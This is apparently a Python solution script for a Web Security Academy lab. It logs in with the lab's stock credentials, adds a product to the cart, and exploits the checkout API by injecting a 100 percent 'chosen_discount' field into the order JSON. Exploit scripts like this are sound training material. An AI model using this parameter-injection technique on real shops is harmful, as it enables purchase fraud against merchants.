import requests
from bs4 import BeautifulSoup as BS


def get_csrf_token(response_text):
    """
    Extract CSRF token from the HTML response.
    """
    soup = BS(response_text, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})
    if csrf_input:
        return csrf_input["value"]
    return None


if __name__ == "__main__":
    base_url = "https://0aa900de03e62be98226f13800930023.web-security-academy.net/"
    login_url = base_url + "login"
    product_url = base_url + "product?productId=1"
    cart_url = base_url + "cart"
    checkout_url = base_url + "api/checkout"

    headers = {
        "Host": "0aa900de03e62be98226f13800930023.web-security-academy.net",
        "Accept": "application/json, text/plain, */*",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
    }

    user = "wiener"
    password = "peter"

    # Step 1: Fetch the initial page to get cookies
    response = requests.get(base_url, headers=headers)
    if response.status_code == 200:
        cookies = dict(response.cookies)
        print("Initial Cookie:", cookies)
    else:
        print("Error fetching initial page: ", response.reason)
        exit()

    # Step 2: Fetch login page to get CSRF token
    res = requests.get(login_url, headers=headers, cookies=cookies)
    csrf_token = get_csrf_token(res.text)
    if not csrf_token:
        print("Failed to extract CSRF token")
        exit()
    print("CSRF Token:", csrf_token)

    # Step 3: Log in with credentials and CSRF token
    login_body = f"csrf={csrf_token}&username={user}&password={password}"
    res = requests.post(login_url, headers=headers, data=login_body, cookies=cookies, allow_redirects=False)
    if res.status_code == 302:
        print("Logged in successfully")
        cookies.update(res.cookies)  # Update cookies with the new session after login
    else:
        print("Login failed: ", res.reason)
        exit()

    # Step 4: Add product to the cart
    headers.update({"Referer": product_url})
    cart_body = "productId=1&redir=PRODUCT&quantity=1"
    res = requests.post(cart_url, headers=headers, data=cart_body, cookies=cookies, allow_redirects=False)
    if res.status_code == 302:
        print("Product added to cart")
        cookies.update(res.cookies)  # Update cookies after adding to cart
    else:
        print("Failed to add product to cart: ", res.reason)
        exit()

    # Step 5: Exploit the API endpoint at /api/checkout
    print("Attempting checkout exploit...")
    payload = {
        "chosen_discount": {
            "percentage": 100
        },
        "chosen_products": [
            {
                "product_id": "1",
                "quantity": 1
            }
        ]
    }

    # Debugging: Print cookies and headers before the request
    print("Cookies before checkout:", cookies)
    print("Headers before checkout:", headers)
    print("Payload:", payload)

    res = requests.post(checkout_url, headers=headers, json=payload, cookies=cookies, allow_redirects=False)
    if res.status_code in [200, 201]:  # Accept both 200 OK and 201 Created as successful outcomes
        print("Checkout successful: Lab solved!")
    else:
        print("Checkout failed. Status Code:", res.status_code)
        print("Response Text:", res.text)

